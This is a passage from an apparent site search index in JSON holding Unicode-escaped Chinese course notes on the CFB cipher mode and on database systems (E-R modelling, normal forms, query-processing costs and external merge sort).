\u53ef\u4ee5\u8bbe\u7f6e\u4f4d\u79fb\u6b65\u957f\uff08\u5f53\u6b65\u957f\u4e3a\u4e00\u7ec4\u7684\u957f\u5ea6\u65f6\uff0c\u7b97\u6cd5\u7ea6\u7b49\u4e8eCBC\uff09\uff0c\u7ec4\u4e0e\u7ec4\u4e4b\u95f4\u7406\u8bba\u4e0a\u5b58\u5728\u76f8\u4e92\u5370\u8bc1\u5173\u7cfb\uff0c\u4f7f\u5f97\u5176\u5728\u5bc6\u6587\u4f20\u8f93\u4e2d\u82e5\u4ea7\u751f\u9519\u8bef\uff0c\u4e5f\u53ea\u4f1a\u5f71\u54cd\u90e8\u5206\u6570\u636e\u3002 \u4e00\u822c\u60c5\u51b5\u4e0b\uff0cECB\u7684\u52a0\u5bc6\u5757\u5927\u5c0f\u4e3a8byte\uff0c\u800cCFB\u91c7\u75281byte\u3002\u52a0\u5bc6\u6d41\u7a0b\u5982\u4e0b\u56fe\u6240\u793a\u3002\u5176\u4e2dP\u4e3a\u660e\u6587(P1,P2...Pn)\uff0cC\u4e3a\u5bc6\u6587\uff0cEk\u4e3a\u4ee5k\u4e3a\u5bc6\u94a5\u7684\u52a0\u5bc6\u7b97\u6cd5\uff0cX1\u4e3a\u521d\u59cb CFB\u4f18\u70b9\uff1a\u76f8\u8f83ECB\u66f4\u4e3a\u5b89\u5168\uff0c\u53ef\u4ee5\u4ece\u4f20\u8f93\u7684\u5bc6\u6587\u9519\u8bef\u4e2d\u6062\u590d\u3002","title":"3. \u5bc6\u6587\u53cd\u9988\u6a21\u5f0f CFB"},{"location":"course/crypto/rc4/#4-rc4","text":"","title":"4. \u6d41\u5bc6\u7801\u7b97\u6cd5 RC4"},{"location":"course/db/","text":"\u6570\u636e\u5e93\u7cfb\u7edf(2021-2022\u6625\u590f) Introduction \u4e0a\u7684\u662f\u9ad8\u4e91\u541b\u8001\u5e08\u7684\u6570\u636e\u5e93\u7cfb\u7edf\u8bfe\u7a0b\u3002 \u672c\u8bfe\u7a0b\u5408\u5e76\u4e86\u6570\u636e\u5e93\u7cfb\u7edf\u6982\u5ff5\u53ca\u6570\u636e\u5e93\u7cfb\u7edf\u8bbe\u8ba1\u7684\u5185\u5bb9\u3002 \u56e0\u4e3a\u7ed3\u5408\u4e86\u4e0a\u8bfe\u7684\u82f1\u6587\u7b14\u8bb0\u4ee5\u53ca\u671f\u672b\u590d\u4e60\u7684\u4e2d\u6587\u63d0\u7eb2\uff0c\u5f88\u591a\u5730\u65b9\u90fd\u662f\u4e2d\u82f1\u6587\u6df7\u5408\u6392\u7248\u3002\uff08\u8fd8\u662f\u592a\u61d2\u7684\u7f18\u6545\uff09 \u5982\u679c\u4f60\u6b63\u5728\u4e0a\u8fd9\u95e8\u8bfe\u7a0b\uff0c\u5e76\u5728\u8fdb\u884c\u671f\u672b\u590d\u4e60\uff0c\u6709\u4ee5\u4e0b\u63a8\u8350\u7684\u590d\u4e60\u8def\u7ebf\uff1a \u542c\u8001\u5e08\u7684\u590d\u4e60\u8bfe\u56de\u653e\uff0c\u5212\u590d\u4e60\u91cd\u70b9 \u8ddf\u7740\u5f80\u5c4a\u7684\u590d\u4e60\u7b14\u8bb0+\u8001\u5e08\u7684\u8bfe\u4ef6\u590d\u4e60 \u628a\u590d\u4e60\u5185\u5bb9\u6284\u5230cheating paper\u4e0a\uff0c\u5e76\u8fb9\u5237\u9898\u8fb9\u8865\u5145 \u518d\u542c\u4e00\u904d\u56de\u653e\uff0c\u67e5\u6f0f\u8865\u7f3a\uff08\u8fd9\u5f88\u91cd\u8981\uff0c\u56e0\u4e3a\u6b64\u65f6\u4f60\u5bf9\u6574\u4f53\u7684\u77e5\u8bc6\u8109\u7edc\u5df2\u7ecf\u6709\u4e86\u638c\u63e1\uff0c\u80fd\u771f\u6b63\u542c\u61c2\u8001\u5e08\u5728\u201c\u63d0\u793a\u201d\u4ec0\u4e48\uff09 References \u5b59\u5efa\u4f36\u8001\u5e08\u7684\u8bfe\u4ef6 \u5c0f\u89d2\u9f99\u5b66\u957f\u7684\u7b14\u8bb0 RandomStar\u5b66\u957f\u7684\u7b14\u8bb0","title":"\u6570\u636e\u5e93\u7cfb\u7edf(2021-2022\u6625\u590f)"},{"location":"course/db/#2021-2022","text":"","title":"\u6570\u636e\u5e93\u7cfb\u7edf(2021-2022\u6625\u590f)"},{"location":"course/db/#introduction","text":"\u4e0a\u7684\u662f\u9ad8\u4e91\u541b\u8001\u5e08\u7684\u6570\u636e\u5e93\u7cfb\u7edf\u8bfe\u7a0b\u3002 \u672c\u8bfe\u7a0b\u5408\u5e76\u4e86\u6570\u636e\u5e93\u7cfb\u7edf\u6982\u5ff5\u53ca\u6570\u636e\u5e93\u7cfb\u7edf\u8bbe\u8ba1\u7684\u5185\u5bb9\u3002 \u56e0\u4e3a\u7ed3\u5408\u4e86\u4e0a\u8bfe\u7684\u82f1\u6587\u7b14\u8bb0\u4ee5\u53ca\u671f\u672b\u590d\u4e60\u7684\u4e2d\u6587\u63d0\u7eb2\uff0c\u5f88\u591a\u5730\u65b9\u90fd\u662f\u4e2d\u82f1\u6587\u6df7\u5408\u6392\u7248\u3002\uff08\u8fd8\u662f\u592a\u61d2\u7684\u7f18\u6545\uff09 \u5982\u679c\u4f60\u6b63\u5728\u4e0a\u8fd9\u95e8\u8bfe\u7a0b\uff0c\u5e76\u5728\u8fdb\u884c\u671f\u672b\u590d\u4e60\uff0c\u6709\u4ee5\u4e0b\u63a8\u8350\u7684\u590d\u4e60\u8def\u7ebf\uff1a \u542c\u8001\u5e08\u7684\u590d\u4e60\u8bfe\u56de\u653e\uff0c\u5212\u590d\u4e60\u91cd\u70b9 \u8ddf\u7740\u5f80\u5c4a\u7684\u590d\u4e60\u7b14\u8bb0+\u8001\u5e08\u7684\u8bfe\u4ef6\u590d\u4e60 \u628a\u590d\u4e60\u5185\u5bb9\u6284\u5230cheating paper\u4e0a\uff0c\u5e76\u8fb9\u5237\u9898\u8fb9\u8865\u5145 \u518d\u542c\u4e00\u904d\u56de\u653e\uff0c\u67e5\u6f0f\u8865\u7f3a\uff08\u8fd9\u5f88\u91cd\u8981\uff0c\u56e0\u4e3a\u6b64\u65f6\u4f60\u5bf9\u6574\u4f53\u7684\u77e5\u8bc6\u8109\u7edc\u5df2\u7ecf\u6709\u4e86\u638c\u63e1\uff0c\u80fd\u771f\u6b63\u542c\u61c2\u8001\u5e08\u5728\u201c\u63d0\u793a\u201d\u4ec0\u4e48\uff09","title":"Introduction"},{"location":"course/db/#references","text":"\u5b59\u5efa\u4f36\u8001\u5e08\u7684\u8bfe\u4ef6 \u5c0f\u89d2\u9f99\u5b66\u957f\u7684\u7b14\u8bb0 RandomStar\u5b66\u957f\u7684\u7b14\u8bb0","title":"References"},{"location":"course/db/ER/","text":"E-R Model and Normal Form E-R Model Basic Concepts Entity : The set of permitted values for each attributes Relation : A relationship is an association among several entities. Weak entity sets : An entity that does not have a primary key is referred to as a weak entity set . constraints \u7ea6\u675f mapping cardinalities \u6620\u5c04\u57fa\u6570 one-to-one one-to-many many-to-one many-to-many \u53c2\u4e0e\u5ea6\u7ea6\u675f total participation partial participation key\u7ea6\u675f specialization (\u7279\u6b8a\u5316) & generalization (\u6cdb\u5316): converting Non-Binary Relationships to Binary Form Summary of Symbols Reduction of an E-R Schema to Tables (1) Representing Relationshp Sets as Tables (2) Representing Weak Entity Sets (3) Redundancy of Tables 1> Many-to-one/one-to-many -> relationship sets add to \"many\" side 2> one-to-one -> relationship sets add to any side (4) Representing Specialization as Tables Normal Form \u57fa\u672c\u6982\u5ff5 \u5206\u89e3 \u6709\u635f\u5206\u89e3(Lossy Decomposition): \u4e0d\u80fd\u7528\u5206\u89e3\u540e\u7684\u51e0\u4e2a\u5173\u7cfb\u91cd\u5efa\u539f\u672c\u7684\u5173\u7cfb\uff0c\u53cd\u4e4b\u4e3a\u65e0\u635f\u5206\u89e3\u3002 \u65e0\u635f\u5206\u89e3(Lossless Decomposition): \\(R_1\\cap R_2\\) \u662f \\(R_1\\) \u6216 \\(R_2\\) \u7684\u8d85\u7801\uff08\u5145\u8981\u6761\u4ef6\uff09 \u51fd\u6570\u4f9d\u8d56 : \u5bf9\u4e8e\u4efb\u4f55\u4e00\u4e2a\u4e00\u4e2a\u5173\u7cfb \\(R\\) \uff0c\u82e5 \\(\\alpha \\in R,\\beta \\in R\\) \uff0c\u4e14\u7531 \\(R\\) \u4e2d\u4e24\u4e2a\u5143\u7ec4 \\(t_1,t_2\\) \u4e2d\u7684 \\(\\alpha\\) \u5c5e\u6027\u503c\u76f8\u540c\u53ef\u4ee5\u5f97\u51fa\u5176 \\(\\beta\\) \u5c5e\u6027\u503c\u76f8\u540c\uff0c\u5219\u79f0 \\(\\alpha\\to \\beta\\) \u662f\u4e00\u4e2a\u51fd\u6570\u4f9d\u8d56\uff0c\u5373 \\(\\alpha\\) \u53ef\u4ee5\u552f\u4e00\u6807\u8bc6/\u51b3\u5b9a \\(\\beta\\) \u3002\u82e5 \\(R\\) \u4e2d\u7684\u6bcf\u4e2a\u5143\u7ec4\u90fd\u6ee1\u8db3\u51fd\u6570\u4f9d\u8d56\uff0c\u5219\u79f0\u51fd\u6570\u4f9d\u8d56\u5728 \\(R\\) \u4e0a\u6210\u7acb\u3002 \u5e73\u51e1\u7684\u51fd\u6570\u4f9d\u8d56\uff1a \\(\\alpha \\subset \\beta\\) \u63a8\u51fa \\(\\beta \\to \\alpha\\) \\(K\\) \u662f \\(R\\) \u7684\u8d85\u7801 \\(\\iff K\\to R\\) \u95ed\u5305 \uff1a\u7531\u7ed9\u5b9a\u7684\u51fd\u6570\u4f9d\u8d56 \\(F\\) \u6240\u80fd\u63a8\u5bfc\u51fa\u7684\u6240\u6709\u51fd\u6570\u4f9d\u8d56\u6784\u6210\u7684\u96c6\u5408 \\(F^{+}\\) Armstrong\u516c\u7406 \u5c5e\u6027\u96c6\u95ed\u5305\uff1a\u67d0\u5c5e\u6027\u6240\u80fd\u552f\u4e00\u51b3\u5b9a\u7684\u5c5e\u6027\u7684\u96c6\u5408 \u65e0\u5173\u5c5e\u6027 \uff1a\u5982\u679c\u53bb\u9664\u51fd\u6570\u4f9d\u8d56\u4e2d\u7684\u67d0\u4e2a\u5c5e\u6027\u4e0d\u4f1a\u6539\u53d8\u8fd9\u4e2a\u51fd\u6570\u4f9d\u8d56\u96c6\u7684\u95ed\u5305\uff0c\u5219\u79f0\u8be5\u5c5e\u6027\u662f\u65e0\u5173\u7684\u3002 \u6700\u5c0f\u8986\u76d6 \uff1a\u6700\u5c0f\u8986\u76d6 \\(F_c\\) \u5fc5\u987b\u6ee1\u8db3\uff081\uff09 \\(F_c\\) \u4e2d\u4efb\u4f55\u51fd\u6570\u4f9d\u8d56\u4e0d\u542b\u65e0\u5173\u5c5e\u6027\u3002(2) \\(F_c\\) \u4e2d\u4efb\u4f55\u51fd\u6570\u5de6\u534a\u90e8\u5206\u552f\u4e00 \u5bfb\u627e \u6700\u5c0f\u8986\u76d6 \u7684 \u65b9\u6cd5 \u4ee4 \\(F_c=F\\) . \u5229\u7528\u5408\u5e76\u5f8b\u5c06\u6240\u6709 \\(\\alpha\\to\\beta_1,\\alpha\\to\\beta_2,\\dots\\) \u5408\u5e76\u4e3a \\(\\alpha\\to\\beta_1\\beta_2...\\) \u5728 \\(F_c\\) \u4e2d\u5bfb\u627e\u4e00\u4e2a\u5177\u6709\u65e0\u5173\u5c5e\u6027\u7684\u51fd\u6570\u4f9d\u8d56\uff0c\u5e76\u5220\u9664\u8be5\u65e0\u5173\u5c5e\u6027\u3002 \u91cd\u590d\u4e0a\u8ff0\u6b65\u9aa4\u76f4\u81f3 \\(F_c\\) \u4e0d\u53d8 \u4f9d\u8d56\u4fdd\u6301\u5206\u89e3\uff1a\u4ee4 \\(F\\) \u4e3a \\(R\\) \u4e0a\u7684\u4e00\u4e2a\u51fd\u6570\u4f9d\u8d56\u96c6\uff0c \\(R_1,R_2,\\dots,R_n\\) \u662f \\(R\\) \u7684\u5206\u89e3\uff0c\u7528 \\(F_i\\) \u8868\u793a\u53ea\u5305\u542b \\(R_i\\) \u4e2d\u51fa\u73b0\u7684\u5143\u7d20\u7684\u51fd\u6570\u4f9d\u8d56\u7684\u96c6\u5408\uff0c\u82e5 \\((F_1\\cup F_2\\cup\\dots\\cup F_n)^{+}=F^{+}\\) \uff0c\u5219\u8be5\u5206\u89e3\u4e3a\u4f9d\u8d56\u4fdd\u6301\u5206\u89e3\u3002 \u7b2c\u4e00\u8303\u5f0f \u6240\u6709\u5c5e\u6027\u90fd\u662f\u539f\u5b50\u7684(atomic)\uff0c\u5373\u4e0d\u53ef\u518d\u7ec6\u5206\u7684\u3002 BC\u8303\u5f0f Boyce-Codd Normal Form \u6027\u8d28\uff1a\u4efb\u610f\u51fd\u6570\u4f9d\u8d56 \\(\\alpha\\to\\beta\\) \u81f3\u5c11\u6ee1\u8db3\u4e0b\u9762\u4efb\u610f\u4e00\u9879 \\(\\alpha\\to\\beta\\) \u662f\u5e73\u51e1\u7684 \\(\\alpha\\) \u662f \\(R\\) \u7684\u4e00\u4e2a\u8d85\u7801 \u5224\u65ad\u51fd\u6570\u4f9d\u8d56 \\(\\alpha\\to\\beta\\) \u662f\u5426\u8fdd\u53cd\u4e86BCNF\uff1a\u8ba1\u7b97 \\(\\alpha^{+}\\) \uff0c\u82e5\u5176\u65e2\u4e0d\u662f \\(\\beta\\) (\u5e73\u51e1\u7684)\uff0c\u4e5f\u4e0d\u662f\u6240\u6709\u5143\u7d20\u7684\u96c6\u5408(\u4e0d\u662f\u8d85\u7801)\uff0c\u5219\u4e0d\u662fBCNF BCNF\u5206\u89e3\uff08\u540c\u65f6\u4e5f\u662f\u65e0\u635f\u5206\u89e3\uff09 Suppose we have a schema R and a non-trivial dependency \\(\\alpha \\to \\beta\\) causes a violation of BCNF.We decompose R into: \\((\\alpha \\cup \\beta)\\) and \\((R-(\\beta-\\alpha))\\) \u7b2c\u4e09\u8303\u5f0f 3rd Normal Form \u6027\u8d28\uff1a\u4efb\u610f\u51fd\u6570\u4f9d\u8d56 \\(\\alpha\\to\\beta\\) \u81f3\u5c11\u6ee1\u8db3\u4e0b\u9762\u4efb\u610f\u4e00\u9879 \\(\\alpha\\to\\beta\\) \u662f\u5e73\u51e1\u7684 \\(\\alpha\\) \u662f \\(R\\) \u7684\u4e00\u4e2a\u8d85\u7801 \\(\\beta-\\alpha\\) \u4e2d\u7684\u6bcf\u4e2a\u5c5e\u6027A\u90fd\u5305\u542b\u4e8e \\(R\\) \u7684\u5019\u9009\u7801\u4e2d \u4efb\u4f55BCNF\u8303\u5f0f\u90fd\u662f3NF\u8303\u5f0f 3NF\u5206\u89e3 \u76f8\u6bd4\u4e4b\u4e0b\uff0c 3NF\u5206\u89e3\u53ef\u4ee5\u4fdd\u8bc1\u4f9d\u8d56\u4fdd\u6301\uff0c\u800cBCNF\u4e0d\u4e00\u5b9a BCNF\u548c3NF\u90fd\u80fd\u4fdd\u8bc1\u65e0\u635f\u5206\u89e3 Reference \u5206\u89e3\u4e09\u8303\u5f0f+BC\u8303\u5f0f","title":"E-R Model and Normal Form"},{"location":"course/db/ER/#e-r-model-and-normal-form","text":"","title":"E-R Model and Normal Form"},{"location":"course/db/ER/#e-r-model","text":"","title":"E-R Model"},{"location":"course/db/ER/#basic-concepts","text":"Entity : The set of permitted values for each attributes Relation : A relationship is an association among several entities. Weak entity sets : An entity that does not have a primary key is referred to as a weak entity set . constraints \u7ea6\u675f mapping cardinalities \u6620\u5c04\u57fa\u6570 one-to-one one-to-many many-to-one many-to-many \u53c2\u4e0e\u5ea6\u7ea6\u675f total participation partial participation key\u7ea6\u675f specialization (\u7279\u6b8a\u5316) & generalization (\u6cdb\u5316): converting Non-Binary Relationships to Binary Form","title":"Basic Concepts"},{"location":"course/db/ER/#summary-of-symbols","text":"","title":"Summary of Symbols"},{"location":"course/db/ER/#reduction-of-an-e-r-schema-to-tables","text":"(1) Representing Relationshp Sets as Tables (2) Representing Weak Entity Sets (3) Redundancy of Tables 1> Many-to-one/one-to-many -> relationship sets add to \"many\" side 2> one-to-one -> relationship sets add to any side (4) Representing Specialization as Tables","title":"Reduction of an E-R  Schema to Tables"},{"location":"course/db/ER/#normal-form","text":"","title":"Normal Form"},{"location":"course/db/ER/#_1","text":"\u5206\u89e3 \u6709\u635f\u5206\u89e3(Lossy Decomposition): \u4e0d\u80fd\u7528\u5206\u89e3\u540e\u7684\u51e0\u4e2a\u5173\u7cfb\u91cd\u5efa\u539f\u672c\u7684\u5173\u7cfb\uff0c\u53cd\u4e4b\u4e3a\u65e0\u635f\u5206\u89e3\u3002 \u65e0\u635f\u5206\u89e3(Lossless Decomposition): \\(R_1\\cap R_2\\) \u662f \\(R_1\\) \u6216 \\(R_2\\) \u7684\u8d85\u7801\uff08\u5145\u8981\u6761\u4ef6\uff09 \u51fd\u6570\u4f9d\u8d56 : \u5bf9\u4e8e\u4efb\u4f55\u4e00\u4e2a\u4e00\u4e2a\u5173\u7cfb \\(R\\) \uff0c\u82e5 \\(\\alpha \\in R,\\beta \\in R\\) \uff0c\u4e14\u7531 \\(R\\) \u4e2d\u4e24\u4e2a\u5143\u7ec4 \\(t_1,t_2\\) \u4e2d\u7684 \\(\\alpha\\) \u5c5e\u6027\u503c\u76f8\u540c\u53ef\u4ee5\u5f97\u51fa\u5176 \\(\\beta\\) \u5c5e\u6027\u503c\u76f8\u540c\uff0c\u5219\u79f0 \\(\\alpha\\to \\beta\\) \u662f\u4e00\u4e2a\u51fd\u6570\u4f9d\u8d56\uff0c\u5373 \\(\\alpha\\) \u53ef\u4ee5\u552f\u4e00\u6807\u8bc6/\u51b3\u5b9a \\(\\beta\\) \u3002\u82e5 \\(R\\) \u4e2d\u7684\u6bcf\u4e2a\u5143\u7ec4\u90fd\u6ee1\u8db3\u51fd\u6570\u4f9d\u8d56\uff0c\u5219\u79f0\u51fd\u6570\u4f9d\u8d56\u5728 \\(R\\) \u4e0a\u6210\u7acb\u3002 \u5e73\u51e1\u7684\u51fd\u6570\u4f9d\u8d56\uff1a \\(\\alpha \\subset \\beta\\) \u63a8\u51fa \\(\\beta \\to \\alpha\\) \\(K\\) \u662f \\(R\\) \u7684\u8d85\u7801 \\(\\iff K\\to R\\) \u95ed\u5305 \uff1a\u7531\u7ed9\u5b9a\u7684\u51fd\u6570\u4f9d\u8d56 \\(F\\) \u6240\u80fd\u63a8\u5bfc\u51fa\u7684\u6240\u6709\u51fd\u6570\u4f9d\u8d56\u6784\u6210\u7684\u96c6\u5408 \\(F^{+}\\) Armstrong\u516c\u7406 \u5c5e\u6027\u96c6\u95ed\u5305\uff1a\u67d0\u5c5e\u6027\u6240\u80fd\u552f\u4e00\u51b3\u5b9a\u7684\u5c5e\u6027\u7684\u96c6\u5408 \u65e0\u5173\u5c5e\u6027 \uff1a\u5982\u679c\u53bb\u9664\u51fd\u6570\u4f9d\u8d56\u4e2d\u7684\u67d0\u4e2a\u5c5e\u6027\u4e0d\u4f1a\u6539\u53d8\u8fd9\u4e2a\u51fd\u6570\u4f9d\u8d56\u96c6\u7684\u95ed\u5305\uff0c\u5219\u79f0\u8be5\u5c5e\u6027\u662f\u65e0\u5173\u7684\u3002 \u6700\u5c0f\u8986\u76d6 \uff1a\u6700\u5c0f\u8986\u76d6 \\(F_c\\) \u5fc5\u987b\u6ee1\u8db3\uff081\uff09 \\(F_c\\) \u4e2d\u4efb\u4f55\u51fd\u6570\u4f9d\u8d56\u4e0d\u542b\u65e0\u5173\u5c5e\u6027\u3002(2) \\(F_c\\) \u4e2d\u4efb\u4f55\u51fd\u6570\u5de6\u534a\u90e8\u5206\u552f\u4e00 \u5bfb\u627e \u6700\u5c0f\u8986\u76d6 \u7684 \u65b9\u6cd5 \u4ee4 \\(F_c=F\\) . \u5229\u7528\u5408\u5e76\u5f8b\u5c06\u6240\u6709 \\(\\alpha\\to\\beta_1,\\alpha\\to\\beta_2,\\dots\\) \u5408\u5e76\u4e3a \\(\\alpha\\to\\beta_1\\beta_2...\\) \u5728 \\(F_c\\) \u4e2d\u5bfb\u627e\u4e00\u4e2a\u5177\u6709\u65e0\u5173\u5c5e\u6027\u7684\u51fd\u6570\u4f9d\u8d56\uff0c\u5e76\u5220\u9664\u8be5\u65e0\u5173\u5c5e\u6027\u3002 \u91cd\u590d\u4e0a\u8ff0\u6b65\u9aa4\u76f4\u81f3 \\(F_c\\) \u4e0d\u53d8 \u4f9d\u8d56\u4fdd\u6301\u5206\u89e3\uff1a\u4ee4 \\(F\\) \u4e3a \\(R\\) \u4e0a\u7684\u4e00\u4e2a\u51fd\u6570\u4f9d\u8d56\u96c6\uff0c \\(R_1,R_2,\\dots,R_n\\) \u662f \\(R\\) \u7684\u5206\u89e3\uff0c\u7528 \\(F_i\\) \u8868\u793a\u53ea\u5305\u542b \\(R_i\\) \u4e2d\u51fa\u73b0\u7684\u5143\u7d20\u7684\u51fd\u6570\u4f9d\u8d56\u7684\u96c6\u5408\uff0c\u82e5 \\((F_1\\cup F_2\\cup\\dots\\cup F_n)^{+}=F^{+}\\) \uff0c\u5219\u8be5\u5206\u89e3\u4e3a\u4f9d\u8d56\u4fdd\u6301\u5206\u89e3\u3002","title":"\u57fa\u672c\u6982\u5ff5"},{"location":"course/db/ER/#_2","text":"\u6240\u6709\u5c5e\u6027\u90fd\u662f\u539f\u5b50\u7684(atomic)\uff0c\u5373\u4e0d\u53ef\u518d\u7ec6\u5206\u7684\u3002","title":"\u7b2c\u4e00\u8303\u5f0f"},{"location":"course/db/ER/#bc","text":"Boyce-Codd Normal Form \u6027\u8d28\uff1a\u4efb\u610f\u51fd\u6570\u4f9d\u8d56 \\(\\alpha\\to\\beta\\) \u81f3\u5c11\u6ee1\u8db3\u4e0b\u9762\u4efb\u610f\u4e00\u9879 \\(\\alpha\\to\\beta\\) \u662f\u5e73\u51e1\u7684 \\(\\alpha\\) \u662f \\(R\\) \u7684\u4e00\u4e2a\u8d85\u7801 \u5224\u65ad\u51fd\u6570\u4f9d\u8d56 \\(\\alpha\\to\\beta\\) \u662f\u5426\u8fdd\u53cd\u4e86BCNF\uff1a\u8ba1\u7b97 \\(\\alpha^{+}\\) \uff0c\u82e5\u5176\u65e2\u4e0d\u662f \\(\\beta\\) (\u5e73\u51e1\u7684)\uff0c\u4e5f\u4e0d\u662f\u6240\u6709\u5143\u7d20\u7684\u96c6\u5408(\u4e0d\u662f\u8d85\u7801)\uff0c\u5219\u4e0d\u662fBCNF BCNF\u5206\u89e3\uff08\u540c\u65f6\u4e5f\u662f\u65e0\u635f\u5206\u89e3\uff09 Suppose we have a schema R and a non-trivial dependency \\(\\alpha \\to \\beta\\) causes a violation of BCNF.We decompose R into: \\((\\alpha \\cup \\beta)\\) and \\((R-(\\beta-\\alpha))\\)","title":"BC\u8303\u5f0f"},{"location":"course/db/ER/#_3","text":"3rd Normal Form \u6027\u8d28\uff1a\u4efb\u610f\u51fd\u6570\u4f9d\u8d56 \\(\\alpha\\to\\beta\\) \u81f3\u5c11\u6ee1\u8db3\u4e0b\u9762\u4efb\u610f\u4e00\u9879 \\(\\alpha\\to\\beta\\) \u662f\u5e73\u51e1\u7684 \\(\\alpha\\) \u662f \\(R\\) \u7684\u4e00\u4e2a\u8d85\u7801 \\(\\beta-\\alpha\\) \u4e2d\u7684\u6bcf\u4e2a\u5c5e\u6027A\u90fd\u5305\u542b\u4e8e \\(R\\) \u7684\u5019\u9009\u7801\u4e2d \u4efb\u4f55BCNF\u8303\u5f0f\u90fd\u662f3NF\u8303\u5f0f 3NF\u5206\u89e3 \u76f8\u6bd4\u4e4b\u4e0b\uff0c 3NF\u5206\u89e3\u53ef\u4ee5\u4fdd\u8bc1\u4f9d\u8d56\u4fdd\u6301\uff0c\u800cBCNF\u4e0d\u4e00\u5b9a BCNF\u548c3NF\u90fd\u80fd\u4fdd\u8bc1\u65e0\u635f\u5206\u89e3","title":"\u7b2c\u4e09\u8303\u5f0f"},{"location":"course/db/ER/#reference","text":"\u5206\u89e3\u4e09\u8303\u5f0f+BC\u8303\u5f0f","title":"Reference"},{"location":"course/db/query/","text":"Query Processing & Optimization \u67e5\u8be2\u5904\u7406\u5171\u5206\u4e3a\u4e09\u4e2a\u8fc7\u7a0b\uff1a\u6267\u884c(Parsing & Translation)\u3001\u4f18\u5316(Optimization)\u3001\u4f30\u8ba1(Evaluation) Parsing & Translation Measures of Query Cost \\(t_T\\) : time to transfer one block \\(t_S\\) : time for one seek Cost for b block transfers plus S seeks: \\(b*t_T + S*t_S\\) Selection Linear Search(equality on key): \u7ebf\u6027\u641c\u7d22 worst cost: \\(b_r * t_T + t_S\\) (\u5173\u7cfb\u8868\u5b58\u653e\u5728 \\(b_r\\) \u4e2ablock\u4e2d) average cost: \\((b_r/2)*t_T + t_S\\) (\u5728\u67e5\u8be2\u503c\u4e3a\u4e3b\u7801\u7684\u60c5\u51b5\u4e0b) Primary B+-Tree index(equality on key): B+\u6811\u4e3b\u7d22\u5f15\u641c\u7d22 Cost: \\((h_i+1)*(t_T+t_S)\\) \uff0c \\(h_i\\) \u662fB+\u6811\u7684\u9ad8\u5ea6\uff0c\u6bcf\u6b21\u9700\u8981\u4eceDisk\u4e2dSeek\u8be5\u5757\u5e76\u8bfb\u5165\uff0c\u800c\u540e\u9762\u76841\u662f\u6307\u6700\u540e\u627e\u5230\u76ee\u6807\u5757\u65f6\uff0c\u9700\u8981\u8fdb\u884cseek+transfer(\u4f7f\u7528Index\u5fc5\u4e0d\u53ef\u5c11\u7684) Primary B+-Tree index(equality on nonkey): B+\u6811\u4e3b\u7d22\u5f15\uff0c\u5355\u503c(\u975e\u552f\u4e00) Cost: \\(h_i*(t_T+t_S)+t_S+b*t_T\\) \uff0c\u5176\u4e2db\u662f\u5305\u542b\u67e5\u627e\u503c\u7684\u6570\u636e\u5757\u4e2a\u6570\u3002 Secondary B+-Tree index(equality on key): B+\u6811\u8f85\u52a9\u7d22\u5f15 Cost: \\((h_i+1)*(t_T+t_S)\\) \uff0c\u548cB+\u6811\u4e3b\u7d22\u5f15\u641c\u7d22\u539f\u7406\u4e00\u6837 Secondary B+-index on nonkey: B+\u6811\u8f85\u52a9\u7d22\u5f15\uff0c\u5355\u503cv(\u975e\u552f\u4e00) Cost: \\((h_i + m+ n) * (t_T + t_S)\\) m\u6307B+\u6811\u4e2d\uff0c\u5bf9\u5e94\u67e5\u627e\u503cv\u7d22\u5f15\u7684\u5757\u7684\u6570\u91cf n\u6307\u5305\u542b\u67e5\u627e\u503cv\u7684\u6570\u636e\u5757\u7684\u6570\u91cf External Merge Sort M: memory size\uff0c\u5185\u5b58\u5171\u53ef\u5b58\u653e\u7684\u9875\u7684\u4e2a\u6570 \u5927\u81f4\u6d41\u7a0b\u53ef\u4ee5\u901a\u8fc7\u4e0b\u56fe\u8868\u793a\uff1a \u7b2c\u4e00\u8f6e\u4f20\u5165M\u5757\u6570\u636e\uff0c\u8fdb\u884c\u539f\u5730\u6392\u5e8f\u3002\uff08\u4f7f\u7528\u5feb\u6392\u3001\u5806\u6392\u5e8f\u7b49\u539f\u5730\u6392\u5e8f\u7b97\u6cd5\uff09 \u7b2c\u4e8c\u8f6e\u53ca\u540e\u9762\u6bcf\u8f6e\uff0c\u5408\u5e76M-1\u4e2a\u6709\u5e8f\u5e8f\u5217\u3002 \u6ce8\u610f\uff0c\u9700\u8981\u5728memory\u5757\u4e2d\u9884\u7559\u4e00\u4e2a\u533a\u57df\u5b58\u653e\u6392\u5e8f\u597d\u7684\u6709\u5e8f\u5e8f\u5217\uff0c\u6240\u4ee5\u6bcf\u8f6e\u5408\u5e76\u540e\uff0c\u6709\u5e8f\u5e8f\u5217\u7684\u6bb5\u6570\u5c31\u5c11\u4e86M-1\u500d\uff08\u9884\u7559\u51fa\u4e00\u4e2a\u8f93\u51fa\u5757\u7684\u539f\u56e0\u662f\uff1a\u53ef\u4ee5\u4ee5\u5757\u4e3a\u5355\u4f4d\u5199\u56de\uff0c\u8282\u7701\u65f6\u95f4\u5f00\u9500\uff09 block transfers Total number of merge passes required: \\(\\lceil \\log_{M-1}(b_r/M)\\rceil\\) (\u7b2c\u4e00\u6b21\u6392\u5e8f\u88ab\u89c6\u4e3a\u521d\u59cb\u5316\uff0c\u4e0d\u8ba1\u5165\u5176\u4e2d\uff0c\u53ef\u5e26\u5165\u68c0\u9a8c \\(b_r=M\\) \u548c \\(b_r=M-1\\) \u7684\u60c5\u51b5) \u56e0\u4e3a\u5728\u4e00\u8f6e\u5f52\u5e76\u6392\u5e8f\u4e2d\uff0c\u4e00\u4e2a\u5757\u9700\u8981\u7ecf\u5386\u5199\u5165\u5185\u5b58\u3001\u7136\u540e\u5199\u56de\u78c1\u76d8\uff0c\u6240\u4ee5\u6bcf\u8f6e\u7684\u5f00\u9500\u662f \\(2b_r\\) \u6700\u540e\u4e00\u8f6e\u6392\u5e8f\uff0c\u4e0d\u8ba1\u7b97\u5199\u56dedisk\u7684\u5f00\u9500\u3002 \u6240\u4ee5\u603b\u6b21\u6570\u662f \\(b_r(2\\lceil \\log_{M-1}(b_r/M)\\rceil + 1)\\) seek times \u7b2c\u4e00\u6b21\u6392\u5e8f\uff1a \\(\\lceil b_r/M\\rceil\\) \u6b21seek \u7b2c\u4e8c\u6b21\u6392\u5e8f\u53ca\u540e\u9762\u7684\u6392\u5e8f\uff1a\u5047\u8bbe\u6bcf\u6b21\u8bfb\u5165/\u5199\u51fa\u7684\u5757\u6570\u4e3a \\(\\lceil b_b \\rceil\\) \u5219\u9700\u8981 \\(\\lceil b_r/b_b\\rceil\\) 